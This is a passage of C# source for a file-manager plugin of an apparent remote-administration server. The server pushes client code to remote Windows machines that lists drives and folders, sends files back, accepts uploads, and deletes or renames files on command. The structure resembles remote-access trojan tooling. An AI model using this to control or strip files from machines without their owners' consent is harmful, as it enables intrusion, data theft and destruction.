#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class FileManagerPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, FileManagerUI> _clientUIs = new();

        public string PluginId => "filemgr";
        public string DisplayName => "File Manager";
        public string Version => "1.0.0";
        public string Description => "Remote file system browser with upload/download support.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_filemgr
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts = new CancellationTokenSource();

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;

            // Send ready signal immediately so server knows we're running
            await _send(new byte[] { 0xFE });

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = await receiveData();
                    if (data == null || data.Length == 0) break;

                    byte cmd = data[0];
                    byte[] payload = new byte[data.Length - 1];
                    if (payload.Length > 0)
                        Buffer.BlockCopy(data, 1, payload, 0, payload.Length);

                    Exception caught = null;
                    try
                    {
                        switch (cmd)
                        {
                            case 0x01:
                                await HandleListDir(Encoding.UTF8.GetString(payload));
                                break;
                            case 0x02:
                                await HandleListDrives();
                                break;
                            case 0x03:
                                await HandleDownloadFile(Encoding.UTF8.GetString(payload));
                                break;
                            case 0x04:
                                await HandleUploadFile(payload);
                                break;
                            case 0x05:
                                await HandleDelete(Encoding.UTF8.GetString(payload));
                                break;
                            case 0x06:
                                await HandleRename(payload);
                                break;
                            case 0x07:
                                await HandleCreateDir(Encoding.UTF8.GetString(payload));
                                break;
                            case 0x08:
                                await HandleGetInfo(Encoding.UTF8.GetString(payload));
                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        caught = ex;
                    }
                    if (caught != null)
                    {
                        await SendError(cmd, caught.Message);
                    }
                }
            }
            catch { }
        }

        private async Task HandleListDir(string path)
        {
            if (string.IsNullOrEmpty(path))
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            DirectoryInfo dir = new DirectoryInfo(path);
            if (!dir.Exists)
            {
                await SendError(0x01, ""Directory not found: "" + path);
                return;
            }

            List<string> entries = new List<string>();

            if (dir.Parent != null)
            {
                entries.Add(""D|..|"" + dir.Parent.FullName + ""|0|"");
            }

            try
            {
                foreach (DirectoryInfo d in dir.GetDirectories())
                {
                    try
                    {
                        string modified = d.LastWriteTime.ToString(""yyyy-MM-dd HH:mm:ss"");
                        entries.Add(""D|"" + d.Name + ""|"" + d.FullName + ""|0|"" + modified);
                    }
                    catch { }
                }
            }
            catch { }

            try
            {
                foreach (FileInfo f in dir.GetFiles())
                {
                    try
                    {
                        string modified = f.LastWriteTime.ToString(""yyyy-MM-dd HH:mm:ss"");
                        entries.Add(""F|"" + f.Name + ""|"" + f.FullName + ""|"" + f.Length + ""|"" + modified);
                    }
                    catch { }
                }
            }
            catch { }

            string result = dir.FullName + ""\n"" + string.Join(""\n"", entries);
            byte[] resultBytes = Encoding.UTF8.GetBytes(result);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x01;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task HandleListDrives()
        {
            List<string> drives = new List<string>();
            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                try
                {
                    string label = d.IsReady ? d.VolumeLabel : """";
                    string type = d.DriveType.ToString();
                    long total = d.IsReady ? d.TotalSize : 0;
                    long free = d.IsReady ? d.AvailableFreeSpace : 0;
                    drives.Add(d.Name + ""|"" + label + ""|"" + type + ""|"" + total + ""|"" + free);
                }
                catch { }
            }

            string result = string.Join(""\n"", drives);
            byte[] resultBytes = Encoding.UTF8.GetBytes(result);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x02;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task HandleDownloadFile(string filePath)
        {
            FileInfo fi = new FileInfo(filePath);
            if (!fi.Exists)
            {
                await SendError(0x03, ""File not found: "" + filePath);
                return;
            }

            byte[] nameBytes = Encoding.UTF8.GetBytes(fi.Name);
            long fileSize = fi.Length;
            int chunkSize = 32768;
            int totalChunks = (int)((fileSize + chunkSize - 1) / chunkSize);
            if (totalChunks == 0) totalChunks = 1;

            byte[] header = new byte[1 + 2 + nameBytes.Length + 8 + 4];
            header[0] = 0x10;
            header[1] = (byte)(nameBytes.Length & 0xFF);
            header[2] = (byte)((nameBytes.Length >> 8) & 0xFF);
            Buffer.BlockCopy(nameBytes, 0, header, 3, nameBytes.Length);
            int off = 3 + nameBytes.Length;
            byte[] sizeBytes = BitConverter.GetBytes(fileSize);
            Buffer.BlockCopy(sizeBytes, 0, header, off, 8);
            off += 8;
            byte[] chunkCountBytes = BitConverter.GetBytes(totalChunks);
            Buffer.BlockCopy(chunkCountBytes, 0, header, off, 4);
            await _send(header);

            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                byte[] buffer = new byte[chunkSize];
                for (int i = 0; i < totalChunks; i++)
                {
                    int bytesRead = fs.Read(buffer, 0, chunkSize);
                    if (bytesRead <= 0) break;

                    byte[] chunk = new byte[1 + 4 + bytesRead];
                    chunk[0] = 0x11;
                    byte[] idxBytes = BitConverter.GetBytes(i);
                    Buffer.BlockCopy(idxBytes, 0, chunk, 1, 4);
                    Buffer.BlockCopy(buffer, 0, chunk, 5, bytesRead);
                    await _send(chunk);

                    if (i % 10 == 9)
                        Thread.Sleep(10);
                }
            }
        }

        private async Task HandleUploadFile(byte[] payload)
        {
            if (payload.Length < 2) return;

            int pathLen = payload[0] | (payload[1] << 8);
            if (payload.Length < 2 + pathLen) return;

            string filePath = Encoding.UTF8.GetString(payload, 2, pathLen);
            int dataOffset = 2 + pathLen;
            int dataLen = payload.Length - dataOffset;

            string dir = Path.GetDirectoryName(filePath);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            using (FileStream fs = new FileStream(filePath, FileMode.Create, FileAccess.Write))
            {
                if (dataLen > 0)
                    fs.Write(payload, dataOffset, dataLen);
            }

            byte[] resultBytes = Encoding.UTF8.GetBytes(filePath);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x04;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task HandleDelete(string path)
        {
            if (File.Exists(path))
            {
                File.Delete(path);
            }
            else if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
            }
            else
            {
                await SendError(0x05, ""Path not found: "" + path);
                return;
            }

            byte[] resultBytes = Encoding.UTF8.GetBytes(""OK|"" + path);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x05;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task HandleRename(byte[] payload)
        {
            string text = Encoding.UTF8.GetString(payload);
            string[] parts = text.Split(new char[] { '|' }, 2);
            if (parts.Length != 2)
            {
                await SendError(0x06, ""Invalid rename format"");
                return;
            }

            string oldPath = parts[0];
            string newPath = parts[1];

            if (File.Exists(oldPath))
                File.Move(oldPath, newPath);
            else if (Directory.Exists(oldPath))
                Directory.Move(oldPath, newPath);
            else
            {
                await SendError(0x06, ""Path not found: "" + oldPath);
                return;
            }

            byte[] resultBytes = Encoding.UTF8.GetBytes(""OK|"" + newPath);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x06;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task HandleCreateDir(string path)
        {
            Directory.CreateDirectory(path);

            byte[] resultBytes = Encoding.UTF8.GetBytes(""OK|"" + path);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x07;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task HandleGetInfo(string path)
        {
            string info;
            if (File.Exists(path))
            {
                FileInfo fi = new FileInfo(path);
                info = ""FILE|"" + fi.FullName + ""|"" + fi.Length + ""|"" +
                       fi.CreationTime.ToString(""yyyy-MM-dd HH:mm:ss"") + ""|"" +
                       fi.LastWriteTime.ToString(""yyyy-MM-dd HH:mm:ss"") + ""|"" +
                       fi.LastAccessTime.ToString(""yyyy-MM-dd HH:mm:ss"") + ""|"" +
                       fi.Attributes.ToString();
            }
            else if (Directory.Exists(path))
            {
                DirectoryInfo di = new DirectoryInfo(path);
                int fileCount = 0;
                int dirCount = 0;
                try { fileCount = di.GetFiles().Length; } catch { }
                try { dirCount = di.GetDirectories().Length; } catch { }
                info = ""DIR|"" + di.FullName + ""|0|"" +
                       di.CreationTime.ToString(""yyyy-MM-dd HH:mm:ss"") + ""|"" +
                       di.LastWriteTime.ToString(""yyyy-MM-dd HH:mm:ss"") + ""|"" +
                       di.LastAccessTime.ToString(""yyyy-MM-dd HH:mm:ss"") + ""|"" +
                       di.Attributes.ToString() + ""|"" + fileCount + "" files, "" + dirCount + "" dirs"";
            }
            else
            {
                await SendError(0x08, ""Path not found: "" + path);
                return;
            }

            byte[] resultBytes = Encoding.UTF8.GetBytes(info);
            byte[] msg = new byte[resultBytes.Length + 1];
            msg[0] = 0x08;
            Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
            await _send(msg);
        }

        private async Task SendError(byte forCommand, string message)
        {
            byte[] errBytes = Encoding.UTF8.GetBytes(message);
            byte[] msg = new byte[errBytes.Length + 2];
            msg[0] = 0xFF;
            msg[1] = forCommand;
            Buffer.BlockCopy(errBytes, 0, msg, 2, errBytes.Length);
            try { await _send(msg); } catch { }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            var ui = new FileManagerUI(context, _host);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;

            if (_clientUIs.TryGetValue(clientId, out var ui))
            {
                ui.HandleServerData(data);
            }

            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui))
            {
                ui.Dispose();
            }
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
        }
    }

    // ==================== FILE ENTRY MODEL ====================

    public class FileEntry
    {
        public bool IsDirectory { get; set; }
        public string Name { get; set; }
        public string FullPath { get; set; }
        public long Size { get; set; }
        public string Modified { get; set; }

        public string SizeDisplay
        {
            get
            {
                if (IsDirectory) return "<DIR>";
                if (Size < 1024) return $"{Size} B";
                if (Size < 1024 * 1024) return $"{Size / 1024.0:F1} KB";
                if (Size < 1024L * 1024 * 1024) return $"{Size / (1024.0 * 1024):F1} MB";
                return $"{Size / (1024.0 * 1024 * 1024):F2} GB";
            }
        }

        public string Icon => IsDirectory ? "📁" : GetFileIcon(Name);

        private static string GetFileIcon(string name)
        {
            string ext = Path.GetExtension(name)?.ToLower();
            return ext switch
            {
                ".exe" or ".msi" => "⚙️",
                ".dll" or ".sys" => "🔧",
                ".txt" or ".log" or ".cfg" or ".ini" or ".conf" => "📄",
                ".jpg" or ".jpeg" or ".png" or ".gif" or ".bmp" or ".ico" => "🖼️",
                ".mp3" or ".wav" or ".flac" or ".ogg" => "🎵",
                ".mp4" or ".avi" or ".mkv" or ".mov" => "🎬",
                ".zip" or ".rar" or ".7z" or ".tar" or ".gz" => "📦",
                ".pdf" => "📕",
                ".doc" or ".docx" => "📘",
                ".xls" or ".xlsx" => "📗",
                ".ppt" or ".pptx" => "📙",
                ".bat" or ".cmd" or ".ps1" or ".sh" => "📜",
                ".cs" or ".cpp" or ".c" or ".h" or ".py" or ".js" or ".html" or ".css" => "💻",
                ".db" or ".sqlite" or ".mdb" => "🗃️",
                ".lnk" => "🔗",
                _ => "📄"
            };
        }
    }

    // ==================== FILE MANAGER UI ====================

    [SupportedOSPlatform("windows")]
    public class FileManagerUI : UserControl, IDisposable
    {
        private readonly PluginContext _context;
        private readonly PluginHost _host;
        private readonly ListView _fileListView;
        private readonly TextBox _pathBox;
        private readonly TextBlock _statusBar;
        private readonly Button _backButton;
        private readonly Button _upButton;
        private readonly Button _refreshButton;
        private readonly Button _drivesButton;
        private readonly Button _downloadButton;
        private readonly Button _uploadButton;
        private readonly Button _deleteButton;
        private readonly Button _newFolderButton;
        private readonly Button _renameButton;

        private string _currentPath = "";
        private readonly Stack<string> _history = new();
        private readonly List<FileEntry> _currentEntries = new();
        private bool _clientReady = false;
        private bool _pendingDrivesRequest = false;

        // File download state
        private string _downloadFileName;
        private long _downloadFileSize;
        private int _downloadTotalChunks;
        private readonly Dictionary<int, byte[]> _downloadChunks = new();

        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private SolidColorBrush BgDark => B("BackgroundBrush");
        private SolidColorBrush BgMedium => B("SurfaceBrush");
        private SolidColorBrush BgLight => B("SurfaceLightBrush");
        private SolidColorBrush FgDefault => B("TextPrimaryBrush");
        private SolidColorBrush FgDim => B("TextSecondaryBrush");
        private SolidColorBrush BorderBrushVal => B("BorderBrush");
        private SolidColorBrush ButtonBg => B("ButtonBgBrush");
        private SolidColorBrush ButtonBgHover => B("ButtonBgHoverBrush");
        private SolidColorBrush ButtonBorder => B("ButtonBorderBrush");

        private static readonly SolidColorBrush AccentBlue = new(Color.FromRgb(56, 132, 255));
        private static readonly SolidColorBrush ButtonBgPressed = new(Color.FromRgb(35, 35, 38));
        private static readonly SolidColorBrush ButtonBgDisabled = new(Color.FromRgb(30, 30, 33));
        private static readonly SolidColorBrush ButtonFgDisabled = new(Color.FromRgb(90, 90, 95));
        private static readonly SolidColorBrush DeleteBg = new(Color.FromRgb(140, 35, 35));
        private static readonly SolidColorBrush DeleteBgHover = new(Color.FromRgb(170, 45, 45));
        private static readonly SolidColorBrush DeleteBgPressed = new(Color.FromRgb(110, 25, 25));
        private static readonly SolidColorBrush AccentBlueHover = new(Color.FromRgb(75, 150, 255));
        private static readonly SolidColorBrush AccentBluePressed = new(Color.FromRgb(40, 110, 220));

        public FileManagerUI(PluginContext context, PluginHost host)
        {
            _context = context;
            _host = host;

            var mainGrid = new Grid();
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // ===== Toolbar =====
            var toolbar = new WrapPanel
            {
                Margin = new Thickness(4),
                Background = BgMedium
            };

            _backButton = MakeThemedButton("◀ Back", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _backButton.Click += (s, e) => GoBack();

            _upButton = MakeThemedButton("⬆ Up", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _upButton.Click += (s, e) => GoUp();

            _refreshButton = MakeThemedButton("🔄 Refresh", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _refreshButton.Click += (s, e) => RefreshCurrent();

            _drivesButton = MakeThemedButton("💽 Drives", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _drivesButton.Click += (s, e) => RequestDrives();

            _downloadButton = MakeThemedButton("⬇ Download", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _downloadButton.Click += (s, e) => DownloadSelected();

            _uploadButton = MakeThemedButton("⬆ Upload", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _uploadButton.Click += (s, e) => UploadFile();

            _deleteButton = MakeThemedButton("🗑 Delete", DeleteBg, DeleteBgHover, DeleteBgPressed);
            _deleteButton.Click += (s, e) => DeleteSelected();

            _newFolderButton = MakeThemedButton("📁+ New Folder", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _newFolderButton.Click += (s, e) => CreateNewFolder();

            _renameButton = MakeThemedButton("✏ Rename", ButtonBg, ButtonBgHover, ButtonBgPressed);
            _renameButton.Click += (s, e) => RenameSelected();

            toolbar.Children.Add(_backButton);
            toolbar.Children.Add(_upButton);
            toolbar.Children.Add(_refreshButton);
            toolbar.Children.Add(_drivesButton);
            toolbar.Children.Add(MakeSeparator());
            toolbar.Children.Add(_downloadButton);
            toolbar.Children.Add(_uploadButton);
            toolbar.Children.Add(MakeSeparator());
            toolbar.Children.Add(_newFolderButton);
            toolbar.Children.Add(_renameButton);
            toolbar.Children.Add(_deleteButton);

            Grid.SetRow(toolbar, 0);
            mainGrid.Children.Add(toolbar);

            // ===== Path bar =====
            var pathPanel = new DockPanel { Margin = new Thickness(4, 0, 4, 4) };

            var goButton = MakeThemedButton("Go", AccentBlue, AccentBlueHover, AccentBluePressed);
            goButton.Click += (s, e) => NavigateTo(_pathBox.Text);
            DockPanel.SetDock(goButton, Dock.Right);

            _pathBox = new TextBox
            {
                Background = BgDark,
                Foreground = FgDefault,
                BorderBrush = BorderBrushVal,
                BorderThickness = new Thickness(1),
                Padding = new Thickness(6, 4, 6, 4),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, monospace"),
                FontSize = 13,
                CaretBrush = FgDefault,
                Style = null
            };
            _pathBox.KeyDown += (s, e) =>
            {
                if (e.Key == Key.Enter) { NavigateTo(_pathBox.Text); e.Handled = true; }
            };

            pathPanel.Children.Add(goButton);
            pathPanel.Children.Add(_pathBox);

            Grid.SetRow(pathPanel, 1);
            mainGrid.Children.Add(pathPanel);

            // ===== File list =====
            _fileListView = new ListView
            {
                Background = BgDark,
                Foreground = FgDefault,
                BorderThickness = new Thickness(0),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, monospace"),
                FontSize = 13,
                Margin = new Thickness(4, 0, 4, 0)
            };

            var gridView = new GridView();
            gridView.Columns.Add(new GridViewColumn
            {
                Header = "",
                DisplayMemberBinding = new System.Windows.Data.Binding("Icon"),
                Width = 30
            });
            gridView.Columns.Add(new GridViewColumn
            {
                Header = "Name",
                DisplayMemberBinding = new System.Windows.Data.Binding("Name"),
                Width = 300
            });
            gridView.Columns.Add(new GridViewColumn
            {
                Header = "Size",
                DisplayMemberBinding = new System.Windows.Data.Binding("SizeDisplay"),
                Width = 100
            });
            gridView.Columns.Add(new GridViewColumn
            {
                Header = "Modified",
                DisplayMemberBinding = new System.Windows.Data.Binding("Modified"),
                Width = 160
            });

            _fileListView.View = gridView;

            var itemStyle = new Style(typeof(ListViewItem));
            itemStyle.Setters.Add(new Setter(Control.ForegroundProperty, FgDefault));
            itemStyle.Setters.Add(new Setter(Control.BackgroundProperty, Brushes.Transparent));
            itemStyle.Setters.Add(new Setter(Control.PaddingProperty, new Thickness(2)));
            itemStyle.Setters.Add(new Setter(Control.MarginProperty, new Thickness(0)));
            itemStyle.Setters.Add(new Setter(Control.BorderThicknessProperty, new Thickness(0)));
            itemStyle.Setters.Add(new Setter(Control.HorizontalContentAlignmentProperty, HorizontalAlignment.Stretch));

            var hoverTrigger = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hoverTrigger.Setters.Add(new Setter(Control.ForegroundProperty, FgDefault));
            hoverTrigger.Setters.Add(new Setter(Control.BackgroundProperty, BgLight));
            itemStyle.Triggers.Add(hoverTrigger);

            var selectedTrigger = new Trigger { Property = System.Windows.Controls.Primitives.Selector.IsSelectedProperty, Value = true };
            selectedTrigger.Setters.Add(new Setter(Control.ForegroundProperty, FgDefault));
            selectedTrigger.Setters.Add(new Setter(Control.BackgroundProperty, AccentBlue));
            itemStyle.Triggers.Add(selectedTrigger);

            var selectedHoverTrigger = new MultiTrigger();
            selectedHoverTrigger.Conditions.Add(new Condition(UIElement.IsMouseOverProperty, true));
            selectedHoverTrigger.Conditions.Add(new Condition(System.Windows.Controls.Primitives.Selector.IsSelectedProperty, true));
            selectedHoverTrigger.Setters.Add(new Setter(Control.ForegroundProperty, FgDefault));
            selectedHoverTrigger.Setters.Add(new Setter(Control.BackgroundProperty, AccentBlueHover));
            itemStyle.Triggers.Add(selectedHoverTrigger);

            _fileListView.ItemContainerStyle = itemStyle;

            _fileListView.MouseDoubleClick += FileList_DoubleClick;
            _fileListView.SelectionChanged += FileList_SelectionChanged;

            Grid.SetRow(_fileListView, 2);
            mainGrid.Children.Add(_fileListView);

            // ===== Status bar =====
            _statusBar = new TextBlock
            {
                Text = "Waiting for client plugin to start...",
                Foreground = FgDim,
                Background = BgMedium,
                Padding = new Thickness(8, 4, 8, 4),
                FontSize = 12
            };

            Grid.SetRow(_statusBar, 3);
            mainGrid.Children.Add(_statusBar);

            this.Content = mainGrid;
            this.Background = BgDark;

            _pendingDrivesRequest = true;
        }

        // ==================== UI HELPERS ====================

        private Button MakeThemedButton(string text, SolidColorBrush normalBg, SolidColorBrush hoverBg, SolidColorBrush pressedBg)
        {
            var button = new Button
            {
                Content = text,
                Margin = new Thickness(2),
                Padding = new Thickness(8, 4, 8, 4),
                Cursor = Cursors.Hand,
                FontSize = 12,
                Foreground = FgDefault
            };

            // Build a full ControlTemplate so every visual state is explicit
            var template = new ControlTemplate(typeof(Button));

            // The root border whose Background/BorderBrush we animate via triggers
            var borderFactory = new FrameworkElementFactory(typeof(Border), "ButtonBorder");
            borderFactory.SetValue(Border.BackgroundProperty, normalBg);
            borderFactory.SetValue(Border.BorderBrushProperty, ButtonBorder);
            borderFactory.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            borderFactory.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            borderFactory.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            borderFactory.SetValue(Border.SnapsToDevicePixelsProperty, true);

            var contentPresenter = new FrameworkElementFactory(typeof(ContentPresenter));
            contentPresenter.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            contentPresenter.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            borderFactory.AppendChild(contentPresenter);

            template.VisualTree = borderFactory;

            // --- Trigger: IsMouseOver ---
            var hoverTrigger = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hoverTrigger.Setters.Add(new Setter(Border.BackgroundProperty, hoverBg, "ButtonBorder"));
            template.Triggers.Add(hoverTrigger);

            // --- Trigger: IsPressed ---
            var pressedTrigger = new Trigger { Property = System.Windows.Controls.Primitives.ButtonBase.IsPressedProperty, Value = true };
            pressedTrigger.Setters.Add(new Setter(Border.BackgroundProperty, pressedBg, "ButtonBorder"));
            template.Triggers.Add(pressedTrigger);

            // --- Trigger: IsEnabled == false ---
            var disabledTrigger = new Trigger { Property = UIElement.IsEnabledProperty, Value = false };
            disabledTrigger.Setters.Add(new Setter(Border.BackgroundProperty, ButtonBgDisabled, "ButtonBorder"));
            disabledTrigger.Setters.Add(new Setter(Border.BorderBrushProperty, ButtonBgDisabled, "ButtonBorder"));
            disabledTrigger.Setters.Add(new Setter(Button.ForegroundProperty, ButtonFgDisabled));
            template.Triggers.Add(disabledTrigger);

            button.Template = template;

            return button;
        }

        private Border MakeSeparator()
        {
            return new Border
            {
                Width = 1,
                Background = ButtonBorder,
                Margin = new Thickness(4, 2, 4, 2)
            };
        }

        private void SetStatus(string text)
        {
            Dispatcher.Invoke(() => _statusBar.Text = text);
        }

        private void UpdateButtonStates()
        {
            var selected = _fileListView.SelectedItem as FileEntry;
            bool hasSelection = selected != null;
            bool isFile = hasSelection && !selected.IsDirectory;
            bool isParentDir = hasSelection && selected.Name == "..";

            _downloadButton.IsEnabled = isFile;
            _deleteButton.IsEnabled = hasSelection && !isParentDir;
            _renameButton.IsEnabled = hasSelection && !isParentDir;
            _backButton.IsEnabled = _history.Count > 0;
            _upButton.IsEnabled = !string.IsNullOrEmpty(_currentPath);
        }

        // ==================== NAVIGATION ====================

        private void NavigateTo(string path)
        {
            if (string.IsNullOrWhiteSpace(path)) return;

            if (!string.IsNullOrEmpty(_currentPath))
                _history.Push(_currentPath);

            SendListDir(path);
        }

        private void GoBack()
        {
            if (_history.Count == 0) return;
            string prev = _history.Pop();
            SendListDir(prev);
        }

        private void GoUp()
        {
            if (string.IsNullOrEmpty(_currentPath)) return;

            try
            {
                string parent = Path.GetDirectoryName(_currentPath);
                if (!string.IsNullOrEmpty(parent))
                {
                    _history.Push(_currentPath);
                    SendListDir(parent);
                }
                else
                {
                    RequestDrives();
                }
            }
            catch
            {
                RequestDrives();
            }
        }

        private void RefreshCurrent()
        {
            if (string.IsNullOrEmpty(_currentPath))
                RequestDrives();
            else
                SendListDir(_currentPath);
        }

        private void FileList_DoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (_fileListView.SelectedItem is FileEntry entry)
            {
                if (entry.IsDirectory)
                {
                    NavigateTo(entry.FullPath);
                }
            }
        }

        private void FileList_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            UpdateButtonStates();

            if (_fileListView.SelectedItem is FileEntry entry)
            {
                if (entry.IsDirectory)
                    SetStatus($"Directory: {entry.FullPath}");
                else
                    SetStatus($"File: {entry.FullPath} — {entry.SizeDisplay}");
            }
        }

        // ==================== ACTIONS ====================

        private async void DownloadSelected()
        {
            if (_fileListView.SelectedItem is FileEntry entry && !entry.IsDirectory)
            {
                _downloadChunks.Clear();
                _downloadFileName = null;
                _downloadFileSize = 0;
                _downloadTotalChunks = 0;

                SetStatus($"Downloading: {entry.Name}...");

                byte[] pathBytes = Encoding.UTF8.GetBytes(entry.FullPath);
                byte[] msg = new byte[pathBytes.Length + 1];
                msg[0] = 0x03;
                Buffer.BlockCopy(pathBytes, 0, msg, 1, pathBytes.Length);
                await _context.SendToClient(msg);
            }
        }

        private async void UploadFile()
        {
            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Title = "Select file to upload",
                Filter = "All files (*.*)|*.*"
            };

            if (dlg.ShowDialog() != true) return;

            string localPath = dlg.FileName;
            string remotePath = string.IsNullOrEmpty(_currentPath)
                ? Path.GetFileName(localPath)
                : Path.Combine(_currentPath, Path.GetFileName(localPath));

            try
            {
                byte[] fileData = File.ReadAllBytes(localPath);
                byte[] pathBytes = Encoding.UTF8.GetBytes(remotePath);

                byte[] msg = new byte[1 + 2 + pathBytes.Length + fileData.Length];
                msg[0] = 0x04;
                msg[1] = (byte)(pathBytes.Length & 0xFF);
                msg[2] = (byte)((pathBytes.Length >> 8) & 0xFF);
                Buffer.BlockCopy(pathBytes, 0, msg, 3, pathBytes.Length);
                Buffer.BlockCopy(fileData, 0, msg, 3 + pathBytes.Length, fileData.Length);

                SetStatus($"Uploading: {Path.GetFileName(localPath)} ({fileData.Length:N0} bytes)...");
                await _context.SendToClient(msg);
            }
            catch (Exception ex)
            {
                SetStatus($"Upload error: {ex.Message}");
            }
        }

        private async void DeleteSelected()
        {
            if (_fileListView.SelectedItem is FileEntry entry && entry.Name != "..")
            {
                var result = MessageBox.Show(
                    $"Delete {(entry.IsDirectory ? "directory" : "file")}?\n\n{entry.FullPath}",
                    "Confirm Delete",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Warning);

                if (result != MessageBoxResult.Yes) return;

                SetStatus($"Deleting: {entry.Name}...");

                byte[] pathBytes = Encoding.UTF8.GetBytes(entry.FullPath);
                byte[] msg = new byte[pathBytes.Length + 1];
                msg[0] = 0x05;
                Buffer.BlockCopy(pathBytes, 0, msg, 1, pathBytes.Length);
                await _context.SendToClient(msg);
            }
        }

        private async void CreateNewFolder()
        {
            if (string.IsNullOrEmpty(_currentPath))
            {
                SetStatus("Navigate to a directory first");
                return;
            }

            string name = PromptInput("New Folder", "Enter folder name:");
            if (string.IsNullOrWhiteSpace(name)) return;

            string fullPath = Path.Combine(_currentPath, name);

            byte[] pathBytes = Encoding.UTF8.GetBytes(fullPath);
            byte[] msg = new byte[pathBytes.Length + 1];
            msg[0] = 0x07;
            Buffer.BlockCopy(pathBytes, 0, msg, 1, pathBytes.Length);
            await _context.SendToClient(msg);
        }

        private async void RenameSelected()
        {
            if (_fileListView.SelectedItem is FileEntry entry && entry.Name != "..")
            {
                string newName = PromptInput("Rename", "Enter new name:", entry.Name);
                if (string.IsNullOrWhiteSpace(newName) || newName == entry.Name) return;

                string dir = Path.GetDirectoryName(entry.FullPath) ?? "";
                string newPath = Path.Combine(dir, newName);
                string renameStr = entry.FullPath + "|" + newPath;

                byte[] renameBytes = Encoding.UTF8.GetBytes(renameStr);
                byte[] msg = new byte[renameBytes.Length + 1];
                msg[0] = 0x06;
                Buffer.BlockCopy(renameBytes, 0, msg, 1, renameBytes.Length);
                await _context.SendToClient(msg);
            }
        }

        private string PromptInput(string title, string prompt, string defaultValue = "")
        {
            var dialog = new Window
            {
                Title = title,
                Width = 400,
                Height = 160,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = Window.GetWindow(this),
                Background = BgMedium,
                ResizeMode = ResizeMode.NoResize
            };

            var panel = new StackPanel { Margin = new Thickness(16) };
            panel.Children.Add(new TextBlock
            {
                Text = prompt,
                Foreground = FgDefault,
